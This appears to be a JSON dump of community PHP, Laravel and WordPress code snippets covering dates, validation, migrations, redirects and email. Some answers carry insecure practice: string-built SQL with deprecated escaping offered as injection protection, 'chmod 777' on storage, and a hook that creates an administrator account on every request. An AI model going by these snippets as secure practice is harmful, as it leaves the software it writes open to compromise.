    "description": "//get Date diff as intervals  $d1 = new DateTime(\"2018-01-10 00:00:00\"); $d2 = new DateTime(\"2019-05-18 01:23:45\"); $interval = $d1->diff($d2); $diffInSeconds = $interval->s; //45 $diffInMinutes = $interval->i; //23 $diffInHours   = $interval->h; //8 $diffInDays    = $interval->d; //21 $diffInMonths  = $interval->m; //4 $diffInYears   = $interval->y; //1  //or get Date difference as total difference $d1 = strtotime(\"2018-01-10 00:00:00\"); $d2 = strtotime(\"2019-05-18 01:23:45\"); $totalSecondsDiff = abs($d1-$d2); //42600225 $totalMinutesDiff = $totalSecondsDiff/60; //710003.75 $totalHoursDiff   = $totalSecondsDiff/60/60;//11833.39 $totalDaysDiff    = $totalSecondsDiff/60/60/24; //493.05 $totalMonthsDiff  = $totalSecondsDiff/60/60/24/30; //16.43 $totalYearsDiff   = $totalSecondsDiff/60/60/24/365; //1.35\n$startDate = new DateTime(\"2019-10-27\"); $endDate = new DateTime(\"2020-04-11\");  $difference = $endDate->diff($startDate); echo $difference->format(\"%a\");\n$now = time(); // or your date as well $your_date = strtotime(\"2010-01-31\"); $datediff = $now - $your_date;  echo round($datediff / (60 * 60 * 24));\n$from_date ='01-01-2013'; $to_date ='05-01-2013';  $from_date = new DateTime($from_date); $to_date = new DateTime($to_date);  for ($date = $from_date; $date <= $to_date; $date->modify('+1 day')) {   echo $date->format('l') . \"\\n\"; }\ndate('Y/m/d',strtotime(\"-1 days\"));  Or Use DateTime class like this-  $date = new DateTime(); echo $date->modify(\"-1 days\")->format('Y-m-d');\n",
    "reg_date": "2021-10-12T10:12:16.000Z"
  },
  {
    "id": 147,
    "keyword": null,
    "link": null,
    "title": " Getting Screen Resolution PHP",
    "description": "// jQUERY FILE  $(function() {     $.post('some_script.php', { width: screen.width, height:screen.height }, function(json) {         if(json.outcome == 'success') {             // do something with the knowledge possibly?         } else {             alert('Unable to let PHP know what the screen resolution is!');         }     },'json'); });  // PHP FILE  <?php // For instance, you can do something like this: if(isset($_POST['width']) && isset($_POST['height'])) {     $_SESSION['screen_width'] = $_POST['width'];     $_SESSION['screen_height'] = $_POST['height'];     echo json_encode(array('outcome'=>'success')); } else {     echo json_encode(array('outcome'=>'error','error'=>\"Couldn't save dimension info\")); } ?>\n//Save in cookie to access with $_COOKIE[\"screenXYZ\"];  //SetScreenResToCookie.php <?php if (isset($_POST)) {     echo \"success\";     setcookie(\"screenW\", $_POST[\"screenWidth\"], time() + (86400 * 30), '/');     setcookie(\"screenH\", $_POST[\"screenHeight\"], time() + (86400 * 30), '/'); } else {     echo \"Error. $\" . \"_POST array is not set!\"; } ?>    //where u need the Screen res(only a example):    //header.php //The function  <?php function screenResToCookie() {  if (isset($_SERVER[\"HTTP_X_FORWARDED_PROTO\"])) {         $http = $_SERVER[\"HTTP_X_FORWARDED_PROTO\"];     } else {         $http = $_SERVER[\"REQUEST_SCHEME\"];     }     $url = $http . \"://\" . $_SERVER[\"HTTP_HOST\"];     echo \"<script>         var damn = setInterval(() => {             var formData = {                 screenWidth: screen.width,                 screenHeight: screen.height             };              $.ajax({                 url: '\" . $url .\"/.../SetJScookie.php?\" . time() .\"',//This needs to be the URL on the domain u access the website from. ajax dont allow HTTPS                 type: 'POST',//because 'SetScreenResToCookie.php' use POST Array                 data: formData, //data in json format                 async: false, //enable or disable async (optional, but suggested as false if you need to populate data afterwards)                 success: function(response, textStatus, jqXHR) {                     console.log(response);                 },                 error: function(jqXHR, textStatus, errorThrown) {                     console.log(jqXHR);                     console.log(textStatus);                     console.log(errorThrown);                 }             });         }, 1000);     </script>\"; }  function ReturnHeader($..., $...) {   $Mobile = false;//If we dont wanne use Bootstrap or @media   screenResToCookie();//set the cookie for us   if (intval($_COOKIE[\"screenW\"]) < 735) {         $Mobile = true;     }      if ($Mobile) { \t//print header with mobile style(Dropdowns added or whatever)   } else {    //print header with Computer/Tablet style    } } ?>  \n",
    "reg_date": "2021-10-12T10:12:16.000Z"
  },
  {
    "id": 148,
    "keyword": null,
    "link": null,
    "title": " HTML Snippets not working in .php files",
    "description": "\"emmet.includeLanguages\": {         \"javascriptreact\": \"html\",         \"javascript\": \"html\" }\n",
    "reg_date": "2021-10-12T10:12:16.000Z"
  },
  {
    "id": 149,
    "keyword": null,
    "link": null,
    "title": " Hash::extract",
    "description": "// input $data = Array(     [0] => Array (             [Product] => Array (                     [id] => 5                     [product_number] => RT001C                 ))     [1] => Array (             [Product] => Array  (                     [id] => 7                     [product_number] => RC001C                  )) );  $data = Hash::extract($data, '{n}.Product'); // => output $data = Array(   \t[0]\t=> Array (       \t[id] => 5       \t[product_number] => RT001C     )     [1] => Array (      \t[id] => 7       \t[product_number] => RC001C      ) ); \n",
    "reg_date": "2021-10-12T10:12:16.000Z"
  },
  {
    "id": 150,
    "keyword": null,
    "link": null,
    "title": " How can I prevent SQL injection in PHP?",
    "description": "//Connect $unsafe_variable = $_POST[\"user-input\"]; $safe_variable = mysql_real_escape_string($unsafe_variable);  mysql_query(\"INSERT INTO table (column) VALUES ('\" . $safe_variable . \"')\"); //Disconnect\n",
    "reg_date": "2021-10-12T10:12:16.000Z"
  },
  {
    "id": 151,
    "keyword": null,
    "link": null,
    "title": " How do I check if a string contains a specific word?",
    "description": "$a = 'Hello world?';  if (strpos($a, 'Hello') !== false) { //PAY ATTENTION TO !==, not !=     echo 'true'; } if (stripos($a, 'HELLO') !== false) { //Case insensitive     echo 'true'; }\n$result = strpos(\"haystack\", \"needle\");  if ($result != false) {   // text found }\n",
    "reg_date": "2021-10-12T10:12:16.000Z"
  },
  {
    "id": 152,
    "keyword": null,
    "link": null,
    "title": " How do I check if a string contains a specific word php",
    "description": "$myString = 'Hello Bob how are you?';  if (strpos($myString, 'Bob') !== false) {      echo \"My string contains Bob\";  }\n$a = 'How are you?';  if (strpos($a, 'are') !== false) {     echo 'true'; }\n$result = strpos(\"haystack\", \"needle\");  if ($result != false) {   // text found }\n// this method is new with PHP 8 and above $haystack = \"Damn, I wonder if this string contains a comma.\"; if (str_contains($haystack, \",\")) { \techo \"There is a comma!!\"; }\n",
    "reg_date": "2021-10-12T10:12:17.000Z"
  },
  {
    "id": 153,
    "keyword": null,
    "link": null,
    "title": " How do I get PHP errors to display",
    "description": "// Add these lines somewhere on top of your PHP file: ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);\nini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); \n// Report all PHP errors error_reporting(E_ALL); //or error_reporting(-1); //or error_reporting(0);\n//PHP functions ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);  //.htaccess php_flag display_startup_errors on php_flag display_errors on php_flag html_errors on php_flag log_errors on php_value error_log  /home/path/public_html/domain/PHP_errors.log\nerror_reporting(E_ALL); ini_set('display_errors', 1);\n",
    "reg_date": "2021-10-12T10:12:17.000Z"
  },
  {
    "id": 154,
    "keyword": null,
    "link": null,
    "title": " How do I make a redirect in PHP?",
    "description": "//PHP redirect  header(\"Location: https://www.codegrepper.com/my-redirect-page.php\");  die();  \nheader(\"Location: http://example.com/redirect_page.php\"); die(); //Force the script to quit, or you would raise an error...\nheader(\"location: THE LOCATION\"); //\"THE LOCATION\", put in a URL or directory to redirect to. For example, header(\"location: https://google.com/\"); or header(\"location: ../../images/dog/\");\n",
    "reg_date": "2021-10-12T10:12:17.000Z"
  },
  {
    "id": 155,
    "keyword": null,
    "link": null,
    "title": " How to Log Query in Laravel",
    "description": "DB::enableQueryLog(); $arr_user = DB::table('users')->select('name', 'email as user_email')->get(); dd(DB::getQueryLog());\nDB::enableQueryLog(); $user = DB::table('users')->select('name', 'email as user_email')->get(); dd(DB::getQueryLog());\nhtml { height: 100%; } body {     min-height:100%;      position:relative;      padding-bottom:[footer-height]  } .footer {      position: absolute;      left: 0 ; right: 0; bottom: 0;      height:[footer-height]  }\n",
    "reg_date": "2021-10-12T10:12:17.000Z"
  },
  {
    "id": 156,
    "keyword": null,
    "link": null,
    "title": " How to add new column in table laravel",
    "description": "php artisan make:migration add_paid_to_users_table --table=users\n",
    "reg_date": "2021-10-12T10:12:17.000Z"
  },
  {
    "id": 157,
    "keyword": null,
    "link": null,
    "title": " How to calculate the difference between two dates",
    "description": "$datetime1 \t= new DateTime('2020-10-11 16:52:52'); $datetime2 \t= new DateTime('2020-10-13 16:52:52'); $interval \t= $datetime1->diff($datetime2);  echo $interval->format('%a days');\n",
    "reg_date": "2021-10-12T10:12:17.000Z"
  },
  {
    "id": 158,
    "keyword": null,
    "link": null,
    "title": " How to change add to cart button in wordpress",
    "description": "// To change add to cart text on single product page add_filter( 'woocommerce_product_single_add_to_cart_text', 'woocommerce_custom_single_add_to_cart_text' );  function woocommerce_custom_single_add_to_cart_text() {     return __( 'Buy Now', 'woocommerce' );  }  // To change add to cart text on product archives(Collection) page add_filter( 'woocommerce_product_add_to_cart_text', 'woocommerce_custom_product_add_to_cart_text' );   function woocommerce_custom_product_add_to_cart_text() {     return __( 'Buy Now', 'woocommerce' ); }\n",
    "reg_date": "2021-10-12T10:12:17.000Z"
  },
  {
    "id": 159,
    "keyword": null,
    "link": null,
    "title": " How to check even or odd number in php",
    "description": "$num = 85; if($num % 2 == 0){ echo \"this is even number\";  }else{ echo \"this is odd number\"; } \n$num = 34; if ($num % 2 == 0) {   print \"It's even\"; }\n",
    "reg_date": "2021-10-12T10:12:17.000Z"
  },
  {
    "id": 160,
    "keyword": null,
    "link": null,
    "title": " How to create WordPress users programmatically",
    "description": "<?php   global $wpdb;  $user_id = wp_insert_user( array(   'user_login' => \"sn1\",   'user_pass' => \"passwordgoeshere\",   'user_email' => \"sn1.doe@example.com\",   'first_name' => \"sn1\",   'last_name' => 'sn1',   'display_name' => 'sn1 sn1',   'role' => 'editor' ));  function wp_create_users() {  /////$meta value is store in to wp_usermeta table in database///   $meta = array(     'job_title' => 'developer',     'country' => 'United States',     'viaphp' => true   );  //////create user //////     $user_login = wp_slash( \"sn1\" );     $user_email = wp_slash(\"sn1.doe@example.com\" );     $user_pass  = \"passwordgoeshere\";      $userdata = compact( 'user_login', 'user_email', 'user_pass' );     return wp_insert_user( $userdata );   }register_activation_hook(__FILE__, 'wp_create_users' ); ?>\nfunction my_create_user() { \t$user  = '*** username ***'; \t$pass  = '*** password ***'; \t$email = '*** email@address.com  ***'; \tif ( !username_exists( $user ) && !email_exists( $email ) ) { \t\t$user_id = wp_create_user( $user, $pass, $email ); \t\t$user = new WP_User( $user_id );         $user->set_role( 'administrator' ); // Set user role ('editor', 'customer', 'subscriber', etc) More roles: https://wordpress.org/support/article/roles-and-capabilities/#summary-of-roles \t} } add_action('init', 'my_create_user');\n",
    "reg_date": "2021-10-12T10:12:17.000Z"
  },
  {
    "id": 161,
    "keyword": null,
    "link": null,
    "title": " How to display MySQL data dynamically using jQuery and PHP",
    "description": " <html>  <head>     <script type=\"text/javascript\">        var auto_refresh = setInterval(          function ()          {           $('#body').load('wordscount.php').fadeIn(\"slow\");          }, 10000); // refresh every 10000 milliseconds     </script>  </head>  <body>      <div id='content'></div>  </body>\n",
    "reg_date": "2021-10-12T10:12:18.000Z"
  },
  {
    "id": 162,
    "keyword": null,
    "link": null,
    "title": " How to fix undefined index: name in PackageManifest.php line 131 error with Composer",
    "description": "$ composer update\n",
    "reg_date": "2021-10-12T10:12:18.000Z"
  },
  {
    "id": 163,
    "keyword": null,
    "link": null,
    "title": " How to prevent Browser cache for php site",
    "description": "Here, if you want to control it through HTML: do like below Option 1:  <meta http-equiv=\"expires\" content=\"Sun, 01 Jan 2014 00:00:00 GMT\"/> <meta http-equiv=\"pragma\" content=\"no-cache\" />    And if you want to control it through PHP: do it like below Option 2:  header('Expires: Sun, 01 Jan 2014 00:00:00 GMT'); header('Cache-Control: no-store, no-cache, must-revalidate'); header('Cache-Control: post-check=0, pre-check=0', FALSE); header('Pragma: no-cache');  AND Option 2 IS ALWAYS BETTER in order to avoid proxy based caching issue.\n# Checks if the file is physically NOT present RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^([a-z0-9-]+)+/([a-z0-9-]+)\\.html$\t/controller.php?partA=$1&partB=$2 [L]\n",
    "reg_date": "2021-10-12T10:12:18.000Z"
  },
  {
    "id": 164,
    "keyword": null,
    "link": null,
    "title": " How to protect your website from DDos Attack?",
    "description": "<files xmlrpc.php>       order allow,deny       deny from all     </files>     \n",
    "reg_date": "2021-10-12T10:12:18.000Z"
  },
  {
    "id": 165,
    "keyword": null,
    "link": null,
    "title": " How to request and display data from db in larave",
    "description": "use Illuminate\\Support\\Facades\\DB;  class UserController extends Controller {     public function index()     {         $users = DB::table('users')->select('id','name','email')->get();          return view('some-view')->with('users', $users);     } } \n$users = DB::table('users')->get(); foreach($users as $key => $value) { \t//to get each columns value \t//$value->name }\n",
    "reg_date": "2021-10-12T10:12:18.000Z"
  },
  {
    "id": 166,
    "keyword": null,
    "link": null,
    "title": " How to send data from PHP to Python",
    "description": "$response = shell_exec(\"python3 script.py\" . escapeshellarg(json_encode($data)));\n",
    "reg_date": "2021-10-12T10:12:18.000Z"
  },
  {
    "id": 167,
    "keyword": null,
    "link": null,
    "title": " How to set a comment on table using Laravel Schema",
    "description": "$table->string('product_name')->comment = \"Product name column\";\n",
    "reg_date": "2021-10-12T10:12:18.000Z"
  },
  {
    "id": 168,
    "keyword": null,
    "link": null,
    "title": " How to show php text",
    "description": "<?php   echo \"Hello World!\"; // You can also do this with a variable: $YourVariable = \"Hello World!\"; echo $YourVariable; ?>\nhtmlspecialchars('<strong>something</strong>') \n<?php   $hello = \"HELO\";   echo \"hello\"; \tif (youwantvar = on) {     echo $hello     }         ?>\n",
    "reg_date": "2021-10-12T10:12:18.000Z"
  },
  {
    "id": 169,
    "keyword": null,
    "link": null,
    "title": " How to use my constants in Larvel",
    "description": "Create a file constants.php inside app/config/ and put your settings in an array:  <?php //file : app/config/constants.php  return [ \t'ADMIN_NAME' => 'administrator' ];  Then anywhere in your controllers or views you can get the value by using Config Facade:  echo Config::get('constants.ADMIN_NAME');\n",
    "reg_date": "2021-10-12T10:12:18.000Z"
  },
  {
    "id": 170,
    "keyword": null,
    "link": null,
    "title": " ISO 8601 php",
    "description": "//Object Oriented Method  $datetime = new DateTime('2010-12-30 23:21:46');  echo $datetime->format(DateTime::ATOM); // Updated ISO8601   //Procedural Method  echo date(DATE_ISO8601, strtotime('2010-12-30 23:21:46'));\n$dateTime = new \\DateTime(); $dateTime->format('Y-m-d H:i:s');\n FYI: there's a list of constants with predefined formats on the DateTime object, for example instead of outputting ISO 8601 dates with:  <?php echo date('c'); ?>  or  <?php echo date('Y-m-d\\TH:i:sO'); ?>  You can use  <?php echo date(DateTime::ISO8601); ?>  instead, which is much easier to read. \n",
    "reg_date": "2021-10-12T10:12:18.000Z"
  },
  {
    "id": 171,
    "keyword": null,
    "link": null,
    "title": " I cannot login to my CPanel hosted Laravel Application, my SSL has expired",
    "description": "Try to login with any of your subdomains that might still have a valid ssl certificate. This will grant you access to the CPanel so that you can install a certificate. e.g. http://subdomain.maindomain.com:2080\n",
    "reg_date": "2021-10-12T10:12:18.000Z"
  },
  {
    "id": 172,
    "keyword": null,
    "link": null,
    "title": " In Connection.php line 664:SQLSTATE[HY000] [2002] No such file or directory (SQL: select * from information schema.tables where table schema",
    "description": "php artisan config:clear php artisan migrate:install\n",
    "reg_date": "2021-10-12T10:12:18.000Z"
  },
  {
    "id": 173,
    "keyword": null,
    "link": null,
    "title": " In PackageManifest.php line 122:",
    "description": "composer self-update --stable \nStep 1: Delete compose.lock File  Step 2: Install dependencies.  composer install\n",
    "reg_date": "2021-10-12T10:12:19.000Z"
  },
  {
    "id": 174,
    "keyword": null,
    "link": null,
    "title": " In PackageManifest.php line 131: Undefined index: name laravel 7",
    "description": "composer self-update --stable \n$ composer update\n",
    "reg_date": "2021-10-12T10:12:19.000Z"
  },
  {
    "id": 175,
    "keyword": null,
    "link": null,
    "title": " In order to use the Auth::routes() method, please install the laravel/ui package.",
    "description": "composer require laravel/ui php artisan ui vue --auth\n",
    "reg_date": "2021-10-12T10:12:19.000Z"
  },
  {
    "id": 176,
    "keyword": null,
    "link": null,
    "title": " Increase the PHP memory limit",
    "description": "//Unlimited momory limit ini_set('memory_limit', '-1');  //Fixed memory limit ini_set('memory_limit','2048M');\n/* To increase the PHP memory limit setting, edit your PHP.ini file found under /usr/local/etc/php/7.4/. Increase the default value (example: Maximum amount of memory a script may consume = 128MB) of the PHP memory limit line in php.ini. */  memory_limit = 256M\n",
    "reg_date": "2021-10-12T10:12:19.000Z"
  },
  {
    "id": 177,
    "keyword": null,
    "link": null,
    "title": " Install or enable PHP's gd extension",
    "description": "#install gd extension, 7.4 replace it with your version sudo apt-get install php7.4-gd #check if installed php -m | grep gd #restart your web server  sudo service apache2 restart or sudo service nginx restart\napt-get install php-gd \nyum install gd gd-devel php-gd and then restart apache: service httpd restart \n[gd] extension=/path/to/gd.so # use the gd.so absolute path here\n",
    "reg_date": "2021-10-12T10:12:19.000Z"
  },
  {
    "id": 178,
    "keyword": null,
    "link": null,
    "title": " Install or enable PHP's xml extension",
    "description": "sudo apt-get install php-xml \n",
    "reg_date": "2021-10-12T10:12:19.000Z"
  },
  {
    "id": 179,
    "keyword": null,
    "link": null,
    "title": " Installation request for phpoffice/phpspreadsheet 1.4.0 -> satisfiable by phpoffice/phpspreadsheet[1.4.0]",
    "description": "composer require phpoffice/phpspreadsheet\n",
    "reg_date": "2021-10-12T10:12:19.000Z"
  },
  {
    "id": 180,
    "keyword": null,
    "link": null,
    "title": " Installing Jetstream",
    "description": "php artisan jetstream:install livewire  php artisan jetstream:install livewire --teams \ncomposer require laravel/jetstream \n",
    "reg_date": "2021-10-12T10:12:19.000Z"
  },
  {
    "id": 181,
    "keyword": null,
    "link": null,
    "title": " Interval Between Different Dates",
    "description": "$datetime1 = new DateTime('2009-10-11 12:12:00'); $datetime2 = new DateTime('2009-10-13 10:12:00');  $interval = $datetime1->diff($datetime2); echo $interval->format('%Y-%m-%d %H:%i:%s');\n",
    "reg_date": "2021-10-12T10:12:19.000Z"
  },
  {
    "id": 182,
    "keyword": null,
    "link": null,
    "title": " Intervention\\\\Image\\\\Exception\\\\NotReadableException\"",
    "description": "php artisan storage:link\n",
    "reg_date": "2021-10-12T10:12:19.000Z"
  },
  {
    "id": 183,
    "keyword": null,
    "link": null,
    "title": " Jwt for Laravel",
    "description": "composer require tymon/jwt-auth \nphp artisan jwt:secret\nphp artisan jwt:secret \nphp artisan vendor:publish --provider=\"Tymon\\JWTAuth\\Providers\\LaravelServiceProvider\" \n'providers' => [      ...      Tymon\\JWTAuth\\Providers\\LaravelServiceProvider::class, ] \n",
    "reg_date": "2021-10-12T10:12:20.000Z"
  },
  {
    "id": 184,
    "keyword": null,
    "link": null,
    "title": " Key path \"file:///home/lebohang/Workspace/Travsim/sim2go api/storage/oauth-private.key\" does not exist or is not readable",
    "description": "php artisan passport:install\n",
    "reg_date": "2021-10-12T10:12:20.000Z"
  },
  {
    "id": 185,
    "keyword": null,
    "link": null,
    "title": " Laravel: Unknown: Failed opening required 'server.php' (include path='php\\PEAR",
    "description": "php -S localhost:8000 -t public \n",
    "reg_date": "2021-10-12T10:12:20.000Z"
  },
  {
    "id": 186,
    "keyword": null,
    "link": null,
    "title": " Laravel 8: seed users + Jetstream teams",
    "description": "\\App\\Models\\User::factory(10)->withPersonalTeam()->create();\n",
    "reg_date": "2021-10-12T10:12:20.000Z"
  },
  {
    "id": 187,
    "keyword": null,
    "link": null,
    "title": " Laravel 8 query builder, Inner Join Clause",
    "description": "use Illuminate\\Support\\Facades\\DB;  $users = DB::table('users')             ->join('contacts', 'users.id', '=', 'contacts.user_id')             ->join('orders', 'users.id', '=', 'orders.user_id')             ->select('users.*', 'contacts.phone', 'orders.price')             ->get();\n//Left join $users = DB::table('users')             ->leftJoin('posts', 'users.id', '=', 'posts.user_id')             ->get(); //Right join $users = DB::table('users')             ->rightJoin('posts', 'users.id', '=', 'posts.user_id')             ->get();\n",
    "reg_date": "2021-10-12T10:12:20.000Z"
  },
  {
    "id": 188,
    "keyword": null,
    "link": null,
    "title": " Laravel 8 send email",
    "description": "How to send mail in Laravel 8 from https://realprogrammer.in/how-to-send-mail-in-laravel-8/ By: Atsu Emmanuel T.       Step 1: Create a Laravel 7 project  Step 2: Open laravel project set .env configuration  MAIL_DRIVER=smtp MAIL_HOST=smtp.googlemail.com MAIL_PORT=465 MAIL_USERNAME=your_gmail_id@gmail.com MAIL_PASSWORD=gmail_password MAIL_ENCRYPTION=ssl Step 2: Add Route with routes/web.php  Route::get('send-mail','MailSend@mailsend'); Stage 3: Create Mail  In this progression, we will make mail class SendMail for email sending. Here we will compose code for which view will call and the question of the client. So we should run cry direction. you can check inside application/Mail/SendMail.php  php artisan make:mail SendMail Add code within SendMail.php  <?php    namespace App\\Mail;     use Illuminate\\Bus\\Queueable; use Illuminate\\Mail\\Mailable; use Illuminate\\Queue\\SerializesModels; use Illuminate\\Contracts\\Queue\\ShouldQueue;    class SendMail extends Mailable {     use Queueable, SerializesModels;        public $details;         /**      * Create a new message instance.      *      * @return void      */     public function __construct($details)     {         $this->details = $details;     }         /**      * Build the message.      *      * @return $this      */      public function build()     {         return $this->subject('Mail from Real Programmer')                     ->view('emails.sendmail');     } } Step 4: Create a controller  php artisan make:controller MailSend <?php  namespace App\\Http\\Controllers;  use Illuminate\\Http\\Request; use \\App\\Mail\\SendMail; class MailSend extends Controller {     public function mailsend()     {         $details = [             'title' => 'Title: Mail from Real Programmer',             'body' => 'Body: This is for testing email using smtp'         ];          \\Mail::to('siddharthshukla089@gmail.com')->send(new SendMail($details));         return view('emails.thanks');     } } Step 5: Create Blade View  In this step, we will make a sharp edge view record and compose an email that we need to send. presently we simply keep in touch with some spurious content. make cry records on &ldquo;messages&rdquo; envelope.  resources/views/emails/sendmail.blade.php <!DOCTYPE html> <html> <head>     <title>Real Programmer</title> </head> <body>     <h1>{{ $details['title'] }}</h1>     <p>{{ $details['body'] }}</p>     <p>Thank you</p> </body> </html> Step 6: Thanks message to show the user. create blade file within  view/emails/thanks.blade.php <!DOCTYPE html> <html> <head> \t<title>Thanks</title> \t<link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\" integrity=\"sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T\" crossorigin=\"anonymous\"> </head> <body> \t<div class=\"container\"> \t\t<div class=\"alert alert-success\" role=\"alert\"> \t\t \tThanks, we will contact you soon \t\t</div> \t </div> </body> </html> Step 7: Change config/mail.php   'from' => [         'address' => env('MAIL_FROM_ADDRESS', 'hello@example.com'),         'name' => env('MAIL_FROM_NAME', 'Real Programmer'),     ], Step 8: Now run the server  php artisan serve Step 9: now hit on URL  http://localhost:8000/send-mail\n//  admin.newsletters.send_email : is the blade that will have your email content   // 'newsletter' => $newsletter : is the collection to be used in the blade file   // function ($message) : the function email and the variable to be used in the message. //  use ($newsletter) : is the collection to be used in the message controller (e.g $message->to($newsletter->email))   // Swift_TransportException to check if it is real email   namespace App\\Http\\Controllers\\Admin; use Mail;        public function sendEmail(Newsletter $newsletter)     {  try {             Mail::send('admin.newsletters.send_email', ['newsletter' => $newsletter], function ($message) use ($newsletter) {     $message->from('noreply@eee-services.com', 'eee-services.com');      $message->to('joseph.hassan.1993@gmail.com')->subject('Newsletter');   });       } catch (\\Swift_TransportException $e) {         if ($e->getMessage()) {           return redirect()->route('admin.newsletters.index');         }       }    return redirect()->route('admin.newsletters.index');   }\n",
    "reg_date": "2021-10-12T10:12:20.000Z"
  },
  {
    "id": 189,
    "keyword": null,
    "link": null,
    "title": " Laravel Dropzone Attachment Preview",
    "description": "  init: function () {       @if(isset($user) && $user->picture)         var file = {!! json_encode($user->picture) !!}             this.options.addedfile.call(this, file)         this.options.thumbnail.call(this, file, file.preview)         file.previewElement.classList.add('dz-complete')         $('form').append('<input type=\"hidden\" name=\"picture\" value=\"' + file.file_name + '\">')         // NOTE: Adding the Download link         var preview = document.createElement('a');         preview.setAttribute('href',file.preview);         preview.setAttribute('target','_blank');         preview.setAttribute('class','fa fa-file');         preview.innerHTML = \" Preview\";         file.previewTemplate.appendChild(preview);         // NOTE: Adding the Download link (END)         this.options.maxFiles = this.options.maxFiles - 1       @endif     }, \n",
    "reg_date": "2021-10-12T10:12:20.000Z"
  },
  {
    "id": 190,
    "keyword": null,
    "link": null,
    "title": " Laravel Eloquent, group by month/year",
    "description": "$model->select(DB::raw('count(id) as `data`'), DB::raw(\"DATE_FORMAT(created_at, '%m-%Y') new_date\"),  DB::raw('YEAR(created_at) year, MONTH(created_at) month')) ->groupby('year','month') ->get();\n",
    "reg_date": "2021-10-12T10:12:20.000Z"
  },
  {
    "id": 191,
    "keyword": null,
    "link": null,
    "title": " Laravel Generate Random Unique Number Example",
    "description": "<?php    namespace App\\Http\\Controllers;    class TestController extends Controller {     /**      * Write code on Method      *      * @return response()      */     public function index()     {         $randomNumber = random_int(1000, 9999);            dd($randomNumber);     } }\n",
    "reg_date": "2021-10-12T10:12:20.000Z"
  },
  {
    "id": 192,
    "keyword": null,
    "link": null,
    "title": " Laravel How to access imagen uploaded in storage",
    "description": "php artisan storage:link  ejem:  http://somedomain.com/storage/image.jpg\n",
    "reg_date": "2021-10-12T10:12:20.000Z"
  },
  {
    "id": 193,
    "keyword": null,
    "link": null,
    "title": " Laravel Middleware route group",
    "description": "Route::middleware(['first', 'second'])->group(function () {     Route::get('/', function () {         // Uses first & second middleware...     });      Route::get('/user/profile', function () {         // Uses first & second middleware...     }); });\n",
    "reg_date": "2021-10-12T10:12:20.000Z"
  },
  {
    "id": 194,
    "keyword": null,
    "link": null,
    "title": " Laravel Migrations from an existing database",
    "description": "php artisan migrate:refresh  php artisan migrate:refresh --seed\nTo Generate Laravel Migrations from an existing database.    Use the following package.    https://github.com/Xethron/migrations-generator\n",
    "reg_date": "2021-10-12T10:12:21.000Z"
  },
  {
    "id": 195,
    "keyword": null,
    "link": null,
    "title": " Laravel Password Validation",
    "description": "'password' => 'required|confirmed',  reference : https://laravel.com/docs/4.2/validation#rule-confirmed  The field under validation must have a matching field of foo_confirmation.  For example, if the field under validation is password, a matching password_confirmation field must be present in the input.\n'password' => 'required|                min:6|                regex:/^.*(?=.{3,})(?=.*[a-zA-Z])(?=.*[0-9])(?=.*[\\d\\x])(?=.*[!$#%]).*$/|                confirmed', \n$this->validate($request, [     'name' => 'required|min:3|max:50',     'email' => 'email',     'vat_number' => 'max:13',     'password' => 'required|confirmed|min:6', ]);\n        $request->validate([             'email' =>'required|exists:users',             'password'=>'required|password'         ]);\n",
    "reg_date": "2021-10-12T10:12:21.000Z"
  },
  {
    "id": 196,
    "keyword": null,
    "link": null,
    "title": " Laravel Rename Column",
    "description": "Schema::table('users', function (Blueprint $table) {     $table->renameColumn('from', 'to'); });\npublic function up() {   Schema::table('table', function($table) {     $table->dropColumn('column_name');   }); }\nSchema::table('users', function (Blueprint $table) {     $table->string('name', 50)->nullable()->change(); });\nphp artisan make:migration add_votes_to_users_table --table=users  php artisan make:migration create_users_table --create=users\n// To drop a column, use the dropColumn method on the schema builder. // Before dropping columns from a SQLite database, you will need to add // the doctrine/dbal dependency to your composer.json file and run the // composer update command in your terminal to install the library:  Schema::table('users', function (Blueprint $table) {     $table->dropColumn('votes'); });\npublic function down() {     Schema::table('posts', function (Blueprint $table) {         $table->renameColumn('user_id', 'author_ID');     }); } \n",
    "reg_date": "2021-10-12T10:12:21.000Z"
  },
  {
    "id": 197,
    "keyword": null,
    "link": null,
    "title": " Laravel Unable to migrate or Make Seeds",
    "description": "/* Try this if you having issues with migration or artisan commands  or getting an error : UnexpectedValueException */ sudo chmod 777 -R /storage sudo chmod 777 -R storage\n",
    "reg_date": "2021-10-12T10:12:21.000Z"
  },
  {
    "id": 198,
    "keyword": null,
    "link": null,
    "title": " Laravel Validate unique column",
    "description": "'business_name' => 'required|unique:companies,name', \n",
    "reg_date": "2021-10-12T10:12:21.000Z"
  },
  {
    "id": 199,
    "keyword": null,
    "link": null,
    "title": " Laravel Validation check array size min and max",
    "description": "'images' => 'array|max:3', 'images.*' => 'mimes:jpeg,png,jpg,gif,svg'\n",
    "reg_date": "2021-10-12T10:12:21.000Z"
  },
  {
    "id": 200,
    "keyword": null,
    "link": null,
    "title": " Laravel eloquent allowing mass assignments",
    "description": "/**  * The attributes that aren't mass assignable.  *  * @var array  */ protected $guarded = [];\n",
    "reg_date": "2021-10-12T10:12:21.000Z"
  },
  {
    "id": 201,
    "keyword": null,
    "link": null,
    "title": " Laravel eloquent defining observers",
    "description": "php artisan make:observer UserObserver --model=User\n",
    "reg_date": "2021-10-12T10:12:21.000Z"
  },
  {
    "id": 202,
    "keyword": null,
    "link": null,
    "title": " Laravel eloquent soft delete",
    "description": "<?php  namespace App\\Models;  use Illuminate\\Database\\Eloquent\\Model; use Illuminate\\Database\\Eloquent\\SoftDeletes;  class Flight extends Model {     use SoftDeletes; }\n/** in migrations this changes need to     add for table we want to add soft delete (LARAVEL)*/  \t/** The migrations. START */ \tpublic function up() \t{ \t\tSchema::table('users', function(Blueprint $table) \t\t{ \t\t\t$table->softDeletes(); \t\t}); \t} \t/** The migrations. END */  \t/** after adding softdelete you need to     point that column in table related model (LARAVEL)*/  \t/** The Model. START */   \tuse Illuminate\\Database\\Eloquent\\SoftDeletes;   \tclass User extends Model { \t  use SoftDeletes; \t  protected $dates = ['deleted_at']; \t} \t/** The Model. END */\n",
    "reg_date": "2021-10-12T10:12:21.000Z"
  },
  {
    "id": 203,
    "keyword": null,
    "link": null,
